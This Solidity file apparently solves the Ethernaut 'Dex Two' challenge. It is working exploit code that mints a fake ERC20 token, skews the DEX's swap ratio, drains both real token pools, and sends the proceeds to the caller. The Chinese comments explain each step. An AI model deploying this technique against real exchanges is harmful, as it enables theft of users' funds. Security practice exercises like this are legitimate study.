// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts@v4.9.0/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts@v4.9.0/token/ERC20/IERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract FakeToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("Fake", "FAKE") {
        _mint(msg.sender, initialSupply);
    }
}

contract DexTwoAttackAuto {
    FakeToken public fake;  // 添加状态变量
    
    constructor() {
        // 在构造函数中创建假代币，铸造给这个合约
        fake = new FakeToken(1000);
    }
    
    function attack(address _dex) external {
        IDexTwo dex = IDexTwo(_dex);
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        // 掏空 token1 //drain 掏空的意思
        drainToken(dex, token1);
        
        // 掏空 token2
        drainToken(dex, token2);
        
        // 将获得的真代币转给调用者
        IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
        IERC20(token2).transfer(msg.sender, IERC20(token2).balanceOf(address(this)));
    }
    
    function drainToken(
        IDexTwo dex,
        address targetToken
    ) internal {
        // 1. 查询 DEX 有多少目标代币
        uint256 dexTargetBalance = dex.balanceOf(targetToken, address(dex));
        
        // 2. 给 DEX 转假代币（操控分母）
        fake.transfer(address(dex), dexTargetBalance);
        
        // 3. 计算需要多少假代币
        uint256 dexFakeBalance = fake.balanceOf(address(dex));
        uint256 fakeNeeded = (dexTargetBalance * dexFakeBalance) / dexTargetBalance;
        
        // 4. 授权并交换
        fake.approve(address(dex), fakeNeeded);
        dex.swap(address(fake), targetToken, fakeNeeded);
    }
}